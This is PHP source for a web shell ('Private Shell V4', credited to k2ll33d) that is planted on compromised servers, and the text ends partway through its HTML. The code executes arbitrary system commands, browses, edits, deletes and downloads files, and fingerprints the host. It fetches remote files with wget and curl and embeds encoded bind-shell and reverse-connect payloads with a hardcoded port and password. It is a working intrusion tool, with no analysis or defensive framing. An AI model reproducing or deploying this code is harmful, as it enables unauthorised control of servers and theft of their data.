<?php
// by k2ll33d / fb/k2ll33d
echo '<link rel="SHORTCUT ICON" href="http://ppsd.edusite.me/g/anon.jpeg">';
set_time_limit(0);error_reporting(0);

if(isset($_GET["dl"]) && ($_GET["dl"] != "")){$file = $_GET["dl"];$filez = @file_get_contents($file);header("Content-type: application/octet-stream");header("Content-length: ".strlen($filez));header("Content-disposition: attachment;filename=".basename($file).";");echo $filez;exit;} 
elseif(isset($_GET["dlgzip"]) && ($_GET["dlgzip"] != "")){$file = $_GET['dlgzip'];$filez = gzencode(@file_get_contents($file));header("Content-Type:application/x-gzip\n");header("Content-length: ".strlen($filez));header("Content-disposition: attachment;filename=".basename($file).".gz;");echo $filez;exit;} 
if(isset($_GET["img"])){@ob_clean();$d = magicboom($_GET["y"]);$f = $_GET["img"];$inf = @getimagesize($d.$f);$ext = explode($f,".");$ext = $ext[count($ext)-1];@header("Content-type: ".$inf["mime"]);@header("Cache-control: public");@header("Expires: ".date("r",mktime(0,0,0,1,1,2030)));@header("Cache-control: max-age=".(60*60*24*7));@readfile($d.$f);exit;} $software = getenv("SERVER_SOFTWARE");
if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on") $safemode = TRUE;else $safemode = FALSE;$system = @php_uname();if(strtolower(substr($system,0,3)) == "win")
$win = TRUE;else $win = FALSE;if(isset($_GET['y'])){if(@is_dir($_GET['view'])){$pwd = $_GET['view'];@chdir($pwd);} else{$pwd = $_GET['y'];@chdir($pwd);} } 
if(!$win){if(!$user = rapih(exe("whoami")))$user = "";if(!$id = rapih(exe("id"))) $id = "";$prompt = $user." \$ ";$pwd = @getcwd().DIRECTORY_SEPARATOR;} 
else {$user = @get_current_user();$id = $user;$prompt = $user." &gt;";$pwd = realpath(".")."\\";$v = explode("\\",$d);$v = $v[0];foreach (range("A","Z") as $letter) {$bool = @is_dir($letter.":\\");if ($bool){$letters .= "<a href='?y=".$letter.":\\'>[ ";if ($letter.":" != $v){$letters .= $letter;} else {$letters .= "<span class='gaya'>".$letter."</span>";} $letters .= " ]</a> ";}}} 
if(function_exists("posix_getpwuid") && function_exists("posix_getgrgid")) $posix = TRUE;
else $posix = FALSE;$server_ip = @gethostbyname($_SERVER["HTTP_HOST"]);$my_ip = $_SERVER['REMOTE_ADDR'];$bindport = "13123";$bindport_pass = "k2ll33d";$pwds = explode(DIRECTORY_SEPARATOR,$pwd);$pwdurl = "";for($i = 0 ;$i < sizeof($pwds)-1 ;$i++){$pathz = "";for($j = 0 ;$j <= $i ;$j++){$pathz .= $pwds[$j].DIRECTORY_SEPARATOR;} $pwdurl .= "<a href='?y=".$pathz."'>".$pwds[$i]." ".DIRECTORY_SEPARATOR." </a>";} 
if(isset($_POST['rename'])){$old = $_POST['oldname'];$new = $_POST['newname'];@rename($pwd.$old,$pwd.$new);$file = $pwd.$new;}    if(isset($_POST['chmod'])){ 
$name = $_POST['name'];$value = $_POST['newvalue'];if (strlen($value)==3){$value = 0 . "" . $value;}@chmod($pwd.$name,octdec($value));$file = $pwd.$name;}
if(isset($_POST['chmod_folder'])){$name = $_POST['name'];$value = $_POST['newvalue'];if (strlen($value)==3){$value = 0 . "" . $value;}@chmod($pwd.$name,octdec($value));$file = $pwd.$name;} $buff = "&nbsp;".$software."<br>";$buff .= "&nbsp;".$system."<br>";if($id != "") $buff .= "&nbsp;".$id."<br>";if($safemode) $buff .= "&nbsp;safemode :&nbsp;<b><font style='color:#DD4736'>ON</font></b><br>";else $buff .= "&nbsp;Safemode :&nbsp;<b><font style='color:#00FF00'>OFF</font></b><br>";
function showstat($stat) {if ($stat=="on") {return "<b><font style='color:#00FF00'>ON</font></b>";}else {return "<b><font style='color:#ff0000'>OFF</font></b>";}}
function testmysql() {if (function_exists('mysql_connect')) {return showstat("on");}else {return showstat("off");}}
 function showdisablefunctions() {
    if ($disablefunc=@ini_get("disable_functions")){ return "<span style='color:'><font color=#00FF00><b>".$disablefunc."</b></font></span>"; }
    else { return "<b><span style='color:#00FF00'>NONE</span></b>"; }
    }
function testcurl() {if (function_exists('curl_version')) {return showstat("on");}else {return showstat("off");}}
function testwget() {if (exe('wget --help')) {return showstat("on");}else {return showstat("off");}}
function testperl() {if (exe('perl -h')) {return showstat("on");}else {return showstat("off");}}
function convertByte($s) {
if($s >= 1073741824)
return sprintf('%1.2f',$s / 1073741824 ).' GB';
elseif($s >= 1048576)
return sprintf('%1.2f',$s / 1048576 ) .' MB';
elseif($s >= 1024)
return sprintf('%1.2f',$s / 1024 ) .' KB';
else
return $s .' B';
}
// server ip
$server_ip = @gethostbyname($_SERVER["HTTP_HOST"]);
// your ip ;-)
$my_ip = $_SERVER['REMOTE_ADDR'];
$admin_id=$_SERVER['SERVER_ADMIN'];
$buff .= "&nbsp;Server ip : <b>".$server_ip."</b> | Your   ip : <b>".$my_ip."</b> | Admin : <b>".$admin_id."</b><br />";
$buff .= "&nbsp;Free Disk: "."<span style='color:#00FF1E'><b>".convertByte(disk_free_space("/"))." / ".convertByte(disk_total_space("/"))."</b></span><br />";
$buff .= "&nbsp;Disabled Functions: ".showdisablefunctions()."<br>";
$buff .= "&nbsp;MySQL: ".testmysql()."&nbsp;|&nbsp;Perl: ".testperl()."&nbsp;|&nbsp;cURL: ".testcurl()."&nbsp;|&nbsp;WGet: ".testwget()."<br>";
$buff .= "&nbsp;".$letters."&nbsp;&gt;&nbsp;".$pwdurl;
function rapih($text){return trim(str_replace("<br>","",$text));} 
function magicboom($text){if (!get_magic_quotes_gpc()){return $text;} return stripslashes($text);} 
function showdir($pwd,$prompt){$fname = array();$dname = array();
if(function_exists("posix_getpwuid") && function_exists("posix_getgrgid")) 
$posix = TRUE;else $posix = FALSE;$user = "????:????";
if($dh = opendir($pwd)){while($file = readdir($dh)){
if(is_dir($file)){$dname[] = $file;} 
elseif(is_file($file)){$fname[] = $file;}}closedir($dh);} sort($fname);sort($dname);$path = @explode(DIRECTORY_SEPARATOR,$pwd);$tree = @sizeof($path);$parent = "";
$buff = " <form action='?y=".$pwd."&amp;x=shell' method='post' style='margin:8px 0 0 0;'><table class='cmdbox' style='width:50%;'><tr><td>$prompt</td><td><input onMouseOver='this.focus();' id='cmd' class='inputz' type='text' name='cmd' style='width:400px;' value='' /><input class='inputzbut' type='submit' value='Execute !' name='submitcmd' style='width:80px;' /></td></tr></form><form action='?' method='get' style='margin:8px 0 0 0;'><input type='hidden' name='y' value='".$pwd."' /><tr><td>view file/folder</td><center><td><input onMouseOver='this.focus();' id='goto' class='inputz' type='text' name='view' style='width:400px;' value='".$pwd."' /><input class='inputzbut' type='submit' value='View !' name='submitcmd' style='width:80px;' /></td></center></tr></form></table><table class='explore'> <tr><th>name</th><th style='width:80px;'>size</th><th style='width:210px;'>owner:group</th><th style='width:80px;'>perms</th><th style='width:110px;'>modified</th><th style='width:190px;'>actions</th></tr> ";
if($tree > 2) 
for($i=0;$i<$tree-2;$i++) $parent .= $path[$i].DIRECTORY_SEPARATOR;
else $parent = $pwd;
foreach($dname as $folder){
if($folder == ".") {
if(!$win && $posix){$name=@posix_getpwuid(@fileowner($folder));$group=@posix_getgrgid(@filegroup($folder));$owner = $name['name']."<span class='gaya'> : </span>".$group['name'];} 
else {$owner = $user;}
$buff .= "<tr><td><a href=\"?y=".$pwd."\">$folder</a></td><td>-</td>
<td style=\"text-align:center;\">".$owner."</td>
<td><center>".get_perms($pwd)."</center></td>
<td style=\"text-align:center;\">".date("d-M-Y H:i",@filemtime($pwd))."</td><td><span id=\"titik1\">
<a href=\"?y=$pwd&amp;edit=".$pwd."newfile.php\">newfile</a> | <a href=\"javascript:tukar('titik1','titik1_form');\">newfolder</a>
</span><form action=\"?\" method=\"get\" id=\"titik1_form\" class=\"sembunyi\" style=\"margin:0;padding:0;\"> 
<input type=\"hidden\" name=\"y\" value=\"".$pwd."\" /> 
<input class=\"inputz\" style=\"width:140px;\" type=\"text\" name=\"mkdir\" value=\"a_new_folder\" /> 
<input class=\"inputzbut\" type=\"submit\" name=\"rename\" style=\"width:35px;\" value=\"Go\" /> 
</form></td></tr> ";} 
elseif($folder == ".."){ 
if(!$win && $posix)
{$name=@posix_getpwuid(@fileowner($folder));$group=@posix_getgrgid(@filegroup($folder));
$owner = $name['name']."<span class=\"gaya\"> : </span>".$group['name'];} 
else { $owner = $user; } 
$buff .= "<tr><td>
<a href=\"?y=".$parent."\"><img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAAN1gAADdYBkG95nAAAAAd0SU1FB9oJBxUAM0qLz6wAAALLSURBVDjLbVPRS1NRGP+d3btrs7kZmAYXlSZYUK4HQXCREPWUQSSYID1GEKKx/Af25lM+DCFCe4heygcNdIUEST04QW6BjS0yx5UhkW6FEtvOPfc7p4emXcofHPg453y/73e+73cADyzLOoy/bHzR8/l80LbtYD5v6wf72VzOmwLmTe7u7oZlWccbGhpGNJ92HQwtteNvSqmXJOWjM52dPPMpg/Nd5/8SpFIp9Pf3w7KsS4FA4BljrB1HQCmVc4V7O3oh+mFlZQWxWAwskUggkUhgeXk5Fg6HF5mPnWCAAhhTUGCKQUF5eb4LIa729PRknr94/kfBwMDAsXg8/tHv958FoDxP88YeJTLd2xuLAYAPAIaGhu5IKc9yzsE5Z47jYHV19UOpVNoXQsC7OOdwHNG7tLR0EwD0UCis67p2nXMOACiXK7/ev3/3ZHJy8nEymZwyDMM8qExEyjTN9vr6+oAQ4gaAef3ixVgd584pw+DY3d0tTE9Pj6TT6TfBYJCPj4/fBuA/IBBC+GZmZhZbWlrOOY5jDg8Pa3qpVEKlUoHf70cgEGgeHR2NPHgQV4ODt9Ts7KwEQACgaRpSqVdQSrFqtYpqtSpt2wYDYExMTMy3tbVdk1LWpqXebm1t3TdN86mu65FaMw+sE2KM6T9//pgaGxsb1QE4a2trr5uamq55Gn2l+WRzWgihEVH9EX5AJpOZBwANAHK5XKGjo6OvsbHRdF0XRAQpZZ2U0k9EiogYEYGIlJSS2bY9m0wmHwJQWo301/b2diESiVw2jLoQETFyXeWSy4hc5rqHJKxYLGbn5ubuFovF0qECANjf37e/bmzkjDrjdCgUamU+MCIJIgkpiZXLZZnNZhcWFhbubW5ufu7q6sLOzs7/LgPQ3tra2h+NRvvC4fApAHJvb29rfX19qVAovAawd+Rv/Ac+AMcAGLUJVAA4R138DeF+cX+xR/AGAAAAAElFTkSuQmCC'></a></td><td>-</td>
<td style=\"text-align:center;\">".$owner."</td>
<td><center>".get_perms($parent)."</center></td> <td style=\"text-align:center;\">".date("d-M-Y H:i",@filemtime($parent))."</td>
<td><span id=\"titik2\"><a href=\"?y=$pwd&amp;edit=".$parent."newfile.php\">newfile</a> | <a href=\"javascript:tukar('titik2','titik2_form');\">newfolder</a></span> 
<form action=\"?\" method=\"get\" id=\"titik2_form\" class=\"sembunyi\" style=\"margin:0;padding:0;\"> 
<input type=\"hidden\" name=\"y\" value=\"".$pwd."\" /> 
<input class=\"inputz\" style=\"width:140px;\" type=\"text\" name=\"mkdir\" value=\"a_new_folder\" /> 
<input class=\"inputzbut\" type=\"submit\" name=\"rename\" style=\"width:35px;\" value=\"Go\" /> 
</form></td></tr>";}else{if(!$win && $posix){ 
$name=@posix_getpwuid(@fileowner($folder)); 
$group=@posix_getgrgid(@filegroup($folder)); 
$owner = $name['name']."<span class=\"gaya\"> : </span>".$group['name'];} 
else { $owner = $user; }
$buff .= "<tr><td><a id=\"".clearspace($folder)."_link\" href=\"?y=".$pwd.$folder.DIRECTORY_SEPARATOR."\"><img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAQAAAC1+jfqAAAAAXNSR0IArs4c6QAAAAJiS0dEAP+Hj8y/AAAACXBIWXMAAAsTAAALEwEAmpwYAAAA00lEQVQoz6WRvUpDURCEvzmuwR8s8gr2ETvtLSRaKj6ArZU+VVAEwSqvJIhIwiX33nPO2IgayK2cbtmZWT4W/iv9HeacA697NQRY281Fr0du1hJPt90D+xgc6fnwXjC79JWyQdiTfOrf4nk/jZf0cVenIpEQImGjQsVod2cryvH4TEZC30kLjME+KUdRl24ZDQBkryIvtOJggLGri+hbdXgd90e9++hz6rR5jYtzZKsIDzhwFDTQDzZEsTz8CRO5pmVqB240ucRbM7kejTcalBfvn195EV+EajF1hgAAAABJRU5ErkJggg==' />  $folder</a> 
<form action=\"?y=$pwd\" method=\"post\" id=\"".clearspace($folder)."_form\" class=\"sembunyi\" style=\"margin:0;padding:0;\"> 
<input type=\"hidden\" name=\"oldname\" value=\"".$folder."\" style=\"margin:0;padding:0;\" /> 
<input class=\"inputz\" style=\"width:200px;\" type=\"text\" name=\"newname\" value=\"".$folder."\" /> 
<input class=\"inputzbut\" type=\"submit\" name=\"rename\" value=\"rename\" /> 
<input class=\"inputzbut\" type=\"submit\" name=\"cancel\" value=\"cancel\" onclick=\"tukar('".clearspace($folder)."_form','".clearspace($folder)."_link');\" />
</form> </td><td>DIR</td><td style=\"text-align:center;\">".$owner."</td><td><center>
<a href=\"javascript:tukar('".clearspace($folder)."_link','".clearspace($folder)."_form3');\">".get_perms($pwd.$folder)."</a>
<form action=\"?y=$pwd\" method=\"post\" id=\"".clearspace($folder)."_form3\" class=\"sembunyi\" style=\"margin:0;padding:0;\"> 
<input type=\"hidden\" name=\"name\" value=\"".$folder."\" style=\"margin:0;padding:0;\" /> 
<input class=\"inputz\" style=\"width:200px;\" type=\"text\" name=\"newvalue\" value=\"".substr(sprintf('%o', fileperms($pwd.$folder)), -4)."\" /> 
<input class=\"inputzbut\" type=\"submit\" name=\"chmod_folder\" value=\"chmod\" /> 
<input class=\"inputzbut\" type=\"submit\" name=\"cancel\" value=\"cancel\" 
onclick=\"tukar('".clearspace($folder)."_link','".clearspace($folder)."_form3');\" /></form></center></td><td style=\"text-align:center;\">".date("d-M-Y H:i",@filemtime($folder))."</td><td><a href=\"javascript:tukar('".clearspace($folder)."_link','".clearspace($folder)."_form');\">rename</a>| <a href=\"?y=$pwd&amp;fdelete=".$pwd.$folder."\">delete</a>
</td>
</tr>";}}
foreach($fname as $file){
$full = $pwd.$file;
if(!$win && $posix){$name=@posix_getpwuid(@fileowner($file)); $group=@posix_getgrgid(@filegroup($file)); $owner = $name['name']."<span class=\"gaya\"> : </span>".$group['name'];} 
else { $owner = $user; }
$buff .= "<tr><td><a id=\"".clearspace($file)."_link\" href=\"?y=$pwd&amp;view=$full\"><img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAALEwAACxMBAJqcGAAAAAd0SU1FB9oJBhcTJv2B2d4AAAJMSURBVDjLbZO9ThxZEIW/qlvdtM38BNgJQmQgJGd+A/MQBLwGjiwH3nwdkSLtO2xERG5LqxXRSIR2YDfD4GkGM0P3rb4b9PAz0l7pSlWlW0fnnLolAIPB4PXh4eFunucAIILwdESeZyAifnp6+u9oNLo3gM3NzTdHR+//zvJMzSyJKKodiIg8AXaxeIz1bDZ7MxqNftgSURDWy7LUnZ0dYmxAFAVElI6AECygIsQQsizLBOABADOjKApqh7u7GoCUWiwYbetoUHrrPcwCqoF2KUeXLzEzBv0+uQmSHMEZ9F6SZcr6i4IsBOa/b7HQMaHtIAwgLdHalDA1ev0eQbSjrErQwJpqF4eAx/hoqD132mMkJri5uSOlFhEhpUQIiojwamODNsljfUWCqpLnOaaCSKJtnaBCsZYjAllmXI4vaeoaVX0cbSdhmUR3zAKvNjY6Vioo0tWzgEonKbW+KkGWt3Unt0CeGfJs9g+UU0rEGHH/Hw/MjH6/T+POdFoRNKChM22xmOPespjPGQ6HpNQ27t6sACDSNanyoljDLEdVaFOLe8ZkUjK5ukq3t79lPC7/ODk5Ga+Y6O5MqymNw3V1y3hyzfX0hqvJLybXFd++f2d3d0dms+qvg4ODz8fHx0/Lsbe3964sS7+4uEjunpqmSe6e3D3N5/N0WZbtly9f09nZ2Z/b29v2fLEevvK9qv7c2toKi8UiiQiqHbm6riW6a13fn+zv73+oqorhcLgKUFXVP+fn52+Lonj8ILJ0P8ZICCF9/PTpClhpBvgPeloL9U55NIAAAAAASUVORK5CYII=' /> $file</a> 
<form action=\"?y=$pwd\" method=\"post\" id=\"".clearspace($file)."_form\" class=\"sembunyi\" style=\"margin:0;padding:0;\"> 
<input type=\"hidden\" name=\"oldname\" value=\"".$file."\" style=\"margin:0;padding:0;\" /><input class=\"inputz\" style=\"width:200px;\" type=\"text\" name=\"newname\" value=\"".$file."\" /><input class=\"inputzbut\" type=\"submit\" name=\"rename\" value=\"rename\" /><input class=\"inputzbut\" type=\"submit\" name=\"cancel\" value=\"cancel\" onclick=\"tukar('".clearspace($file)."_link','".clearspace($file)."_form');\" />
</form></td><td>".ukuran($full)."</td><td style=\"text-align:center;\">".$owner."</td><td><center>
<a href=\"javascript:tukar('".clearspace($file)."_link','".clearspace($file)."_form2');\">".get_perms($full)."</a>
<form action=\"?y=$pwd\" method=\"post\" id=\"".clearspace($file)."_form2\" class=\"sembunyi\" style=\"margin:0;padding:0;\"> 
<input type=\"hidden\" name=\"name\" value=\"".$file."\" style=\"margin:0;padding:0;\" /> 
<input class=\"inputz\" style=\"width:200px;\" type=\"text\" name=\"newvalue\" value=\"".substr(sprintf('%o', fileperms($full)), -4)."\" /> 
<input class=\"inputzbut\" type=\"submit\" name=\"chmod\" value=\"chmod\" /> 
<input class=\"inputzbut\" type=\"submit\" name=\"cancel\" value=\"cancel\" onclick=\"tukar('".clearspace($file)."_link','".clearspace($file)."_form2');\" /></form></center></td>
<td style=\"text-align:center;\">".date("d-M-Y H:i",@filemtime($full))."</td> 
<td><a href=\"?y=$pwd&amp;edit=$full\">edit</a> | <a href=\"javascript:tukar('".clearspace($file)."_link','".clearspace($file)."_form');\">rename</a>| <a href=\"?y=$pwd&amp;delete=$full\">delete</a> | <a href=\"?y=$pwd&amp;dl=$full\">download</a>&nbsp;(<a href=\"?y=$pwd&amp;dlgzip=$full\">gz</a>)
</td></tr>";} 
$buff .= "</table>"; return $buff;}
function ukuran($file){if($size = @filesize($file)){if($size <= 1024) return $size;else{if($size <= 1024*1024) {$size = @round($size / 1024,2);;
return "$size kb";} else {$size = @round($size / 1024 / 1024,2);return "$size mb";}}}
else return "???";} function exe($cmd){if(function_exists('system')) {@ob_start();@system($cmd);$buff = @ob_get_contents();$buff = @ob_get_contents();@ob_end_clean();
return $buff;} elseif(function_exists('exec')) {@exec($cmd,$results);$buff = "";foreach($results as $result){$buff .= $result;} return $buff;} 
elseif(function_exists('passthru')){@ob_start();@passthru($cmd);$buff = @ob_get_contents();@ob_end_clean();return $buff;} 
elseif(function_exists('shell_exec')){$buff = @shell_exec($cmd);return $buff;}} function tulis($file,$text){$textz = gzinflate(base64_decode($text));if($filez = @fopen($file,"w")) {@fputs($filez,$textz);@fclose($file);}} 
function ambil($link,$file) {if($fp = @fopen($link,"r")){while(!feof($fp)){$cont.= @fread($fp,1024);}@fclose($fp);$fp2 = @fopen($file,"w");@fwrite($fp2,$cont);@fclose($fp2);} } 
function which($pr){$path = exe("which $pr");
if(!empty($path)) {return trim($path);}
else {return trim($pr);}}
function download($cmd,$url){$namafile = basename($url);
switch($cmd){case 'wwget': exe(which('wget')." ".$url." -O ".$namafile);break;case 'wlynx': exe(which('lynx')." -source ".$url." > ".$namafile);break;case 'wfread' : ambil($wurl,$namafile);break;case 'wfetch' : exe(which('fetch')." -o ".$namafile." -p ".$url);break;case 'wlinks' : exe(which('links')." -source ".$url." > ".$namafile);break;case 'wget' : exe(which('GET')." ".$url." > ".$namafile);break;case 'wcurl' : exe(which('curl')." ".$url." -o ".$namafile);break;default: break;}
return $namafile;}function get_perms($file) {if($mode=@fileperms($file)){$perms='';$perms .= ($mode & 00400) ? 'r' : '-';$perms .= ($mode & 00200) ? 'w' : '-';$perms .= ($mode & 00100) ? 'x' : '-';$perms .= ($mode & 00040) ? 'r' : '-';$perms .= ($mode & 00020) ? 'w' : '-';$perms .= ($mode & 00010) ? 'x' : '-';$perms .= ($mode & 00004) ? 'r' : '-';$perms .= ($mode & 00002) ? 'w' : '-';$perms .= ($mode & 00001) ? 'x' : '-';
return $perms;}else return "??????????";}function clearspace($text){return str_replace(" ","_",$text);}$port_bind_bd_c="bVNhb9owEP2OxH+4phI4NINAN00aYxJaW6maxqbSLxNDKDiXxiLYkW3KGOp/3zlOpo7xIY793jvf +fl8KSQvdinCR2NTofr5p3br8hWmhXw6BQ9mYA8lmjO4UXyD9oSQaAV9AyFPCNRa+pRCWtgmQrJE P/GIhufQg249brd4nmjo9RxBqyNAuwWOdvmyNAKJ+ywlBirhepctruOlW9MJdtzrkjTVKyFB41ZZ dKTIWKb0hoUwmUAcwtFt6+m+EXKVJVtRHGAC07vV/ez2cfwvXSpticytkoYlVglX/fNiuAzDE6VL 3TfVrw4o2P1senPzsJrOfoRjl9cfhWjvIatzRvNvn7+s5o8Pt9OvURzWZV94dQgleag0C3wQVKug Uq2FTFnjDzvxAXphx9cXQfxr6PcthLEo/8a8q8B9LgpkQ7oOgKMbvNeThHMsbSOO69IA0l05YpXk HDT8HxrV0F4LizUWfE+M2SudfgiiYbONxiStebrgyIjfqDJG07AWiAzYBc9LivU3MVpGFV2x1J4W tyxAnivYY8HVFsEqWF+/f7sBk2NRQKcDA/JtsE5MDm9EUG+MhcFqkpX0HmxGbqbkdBTMldaHRsUL ZeoDeOSFBvpefCfXhflOpgTkvJ+jtKiR7vLohYKCqS2ZmMRj4Z5gQZfSiMbi6iqkdnHarEEXYuk6 uPtTdumsr0HC4q5rrzNifV7sC3ZWUmq+LVlVa5OfQjTanZYQO+Uf";$port_bind_bd_pl="ZZJhT8IwEIa/k/AfjklgS2aA+BFmJDB1cW5kHSZGzTK2Qxpmu2wlYoD/bruBIfitd33uvXuvvWr1 NmXRW1DWy7HImo02ebRd19Kq1CIuV3BNtWGzQZeg342DhxcYwcCAHeCWCn1gDOEgi1yHhLYXzfwg tNqKeut/yKJNiUB4skYhg3ZecMETnlmfKKrz4ofFX6h3RZJ3DUmUFaoTszO7jxzPDs0O8SdPEQkD e/xs/gkYsN9DShG0ScwEJAXGAqGufmdq2hKFCnmu1IjvRkpH6hE/Cuw5scfTaWAOVE9pM5WMouM0 LSLK9HM3puMpNhp7r8ZFW54jg5wXx5YZLQUyKXVzwdUXZ+T3imYoV9ds7JqNOElQTjnxPc8kRrVo vaW3c5paS16sjZo6qTEuQKU1UO/RSnFJGaagcFVbjUTCqeOZ2qijNLWzrD8PTe32X9oOgvM0bjGB +hecfOQFlT4UcLSkmI1ceY3VrpKMy9dWUCVCBfTlQX6Owy8=";$back_connect="fZFRS8MwFIXfB/sPWSw2hUrnqyPC0CpD3KStvqh0XRpcsE1KkoKF/XiTtCIV6tu55+Z89yY5W0St ktGB8aihsprPWkVBKsgn1av5zCN1iQGsOv4Fbak6pWmNgU/JUQC4b3lRU3BR7OFqcFhptMOpo28j S2whVulCflCNvXVy//K6fLdWI+SPcekMVpSlxIxTnRdacDSEAnA6gZJRBGMphbwC3uKNw8AhXEKZ ja3ImclYagh61n9JKbTAhu7EobN3Qb4mjW/byr0BSnc3D3EWgqe7fLO1whp5miXx+tHMcNHpGURw Tskvpd92+rxoKEdpdrvZhgBen/exUWf3nE214iT52+r/Cw3/5jaqhKL9iFFpuKPawILVNw==";$back_connect_c="XVHbagIxEH0X/IdhhZLUWF1f1YKIBelFqfZJliUm2W7obiJJLLWl/94k29rWhyEzc+Z2TjpSserA BYyt41JfldftVuc3d7R9q9mLcGeAEk5660sVAakc1FQqFBxqnhkBVlIDl95/3Wa43fpotyCABR95 zzpzYA7CaMq5yaUCK1VAYpup7XaYZpPE1NArIBmBRzgVtVYoJQMcR/jV3vKC1rI6wgSmN/niYb75 i+21cR4pnVYWUaclivcMM/xvRDjhysbHVwde0W+K0wzH9bt3YfRPingClVCnim7a/ZuJC0JTwf3A RkD0fR+B9XJ2m683j/PpPYHFavW43CzzzWyFIfbIAhBiWinBHCo4AXSmFlxiuPB3E0/gXejiHMcY jwcYguIAe2GMNijZ9jL4GYqTSB9AvEmHGjk/m19h1CGvPoHIY5A1Oh2tE3XIe1bxKw77YTyt6T2F 6f9wGEPxJliFkv5Oqr4tE5LYEnoyIfDwdHcXK1ilrfAdUbPPLw=="; ?>
<html><head><title>[+] Pesantren Cyber Team | Private Shell V4 [+]</title><link href='http://fonts.googleapis.com/css?family=Orbitron:700' rel='stylesheet' type='text/css'>
<script type="text/javascript">
function tukar(lama,baru){document.getElementById(lama).style.display = 'none';
document.getElementById(baru).style.display = 'block';}
</script>
<style>.title{font-weight:bold;letter-spacing:1px;font-family: "orbitron";color: lime;font-size:20px;text-shadow: 1px 1px 2px lime;}input[type=text]{-moz-box-shadow:0 0 1px aqua;-webkit-box-shadow:0 0 1px aqua;height:18px;margin-left: 5px;}input:focus, textarea:focus ,button:active{box-shadow: 0 0 5px aqua;-webkit-box-shadow: 0 0 5px rgba(0, 0, 255, 1);-moz-box-shadow: 0 0 5px rgba(0, 0, 255, 1);background:#000033;overflow: auto;}#menu{font-family:orbitron;background: #000033;margin:5px 2px 4px 2px;}div #menu li:hover {cursor:pointer;}div#menu li:hover>ul a:hover{width:118;background:#000033;}div#menu ul {margin:0;padding:0;float:left;-moz-border-radius: 6px; border-radius: 12px; border:1px solid lime;}div#menu li {position:relative;display:block;float:left;}div#menu li:hover>ul {left:0px;border-left:1px solid aqua;}div#menu a{display:block;float:left;font-family:orbitron;padding:4px 6px;margin:0;text-decoration:none;letter-spacing:1px;color:lime;}div#menu a:hover{background:#000050;font-family:orbitron;border-bottom:0px;}div#menu ul ul {position:absolute;top:18px;left:-990em;width:130px;padding:5px 0 5px 0;background:blue;margin-top:2px;}div#menu ul ul a {padding:2px 2px 2px 10px;height:20px;float:none;display:block;color:aqua;}.k2ll33d2 {text-align: center;letter-spacing:1px;font-family: "orbitron";color: #00ff00;font-size:25px;text-shadow: 5px 5px 5px black;} .mybox{-moz-border-radius: 10px; border-radius: 10px;border:1px solid aqua; padding:4px 2px;width:70%;line-height:24px;background:#000033;box-shadow: 0px 4px 2px white;-webkit-box-shadow: 0px 4px 2px aqua;-moz-box-shadow: 0px 4px 2px aqua;}.myboxtbl{ width:50%; }body{background:#000033;} a {text-decoration:none;} hr, a:hover{border-bottom:1px solid aqua;} *{text-shadow: 0pt 0pt 0.3em rgb(153, 153, 153);font-size:11px;font-family:Tahoma,Verdana,Arial;color:aqua;} .tabnet{margin:15px auto 0 auto;border: 1px solid aqua;} .main {width:100%;} .gaya {color: #000033;} .top{border-left:1px solid #000033;border-RIGHT:1px solid #000033;font-family:verdana;} .inputz, option{outline:none;transition: all 0.20s ease-in-out;-webkit-transition: all 0.20s ease-in-out;-moz-transition: all 0.20s ease-in-out;border:1px solid rgba(0,0,0, 0.2);background:#000033; border:0; padding:2px; border-bottom:1px solid #000033; font-size:11px; color:aqua; -moz-border-radius: 6px; border-radius: 12px; border:1px solid #4C83AF;margin:4px 0 8px 0;} .inputzbut{background:#000033;color:aqua;margin:0 4px;border:1px solid lime;}  .inputzbut:hover{background:lime;border-left:1px solid #000033;border-right:1px solid #000033;border-bottom:1px solid #4C83AF;border-top:1px solid #4C83AF;}.inputz:hover{ -moz-border-radius: 6px; border-radius: 10px; border:1px solid #4C83AF;margin:4px 0 8px 0;border-bottom:1px solid #4C83AF;border-top:1px solid #4C83AF;}.output2 {margin:auto;border:1px solid aqua;background:#000033;padding:0 2px;} textarea{margin:auto;border:2px solid lime;background:#000033;padding:0 2px;} .output {margin:auto;border:1px solid #303030;width:100%;height:400px;background:#000033;padding:0 2px;} .cmdbox{width:100%;}.head_info{padding: 0 4px;} .b1{font-size:30px;padding:0;color:aqua;} .b2{font-size:30px;padding:0;color:#000033;} .b_tbl{text-align:center;margin:0 4px 0 0;padding:0 4px 0 0;border-right:1px solid #000033;} .phpinfo table{width:100%;padding:0 0 0 0;} .phpinfo td{background:#000040;color:aqua;padding:6px 8px;;} .phpinfo th, th{background:#000040;border-bottom:1px solid #000040;font-weight:normal;} .phpinfo h2, .phpinfo h2 a{text-align:center;font-size:16px;padding:0;margin:30px 0 0 0;background:#000040;padding:4px 0;} .explore{width:100%;} .explore a {text-decoration:none;} .explore td{border-bottom:1px solid #000033;padding:0 8px;line-height:24px;} .explore th{padding:3px 8px;font-weight:normal;color:aqua;} .explore th:hover , .phpinfo th:hover, th:hover{color:black;background:#000033;} .explore tr:hover{background:rgba(35,96,156,0.2);} .viewfile{background:#000040;color:aqua;margin:4px 2px;padding:8px;} .sembunyi{display:none;padding:0;margin:0;} k, k a, k a:hover{text-shadow: 0pt 0pt 0.3em red;font-family:orbitron;font-size:25px;color:#ffffff;}</style><body onLoad="document.getElementById('cmd').focus();"><div class="main"><div class="head_info"> <table width="100%"><tr><td width="23%"><table class="b_tbl">
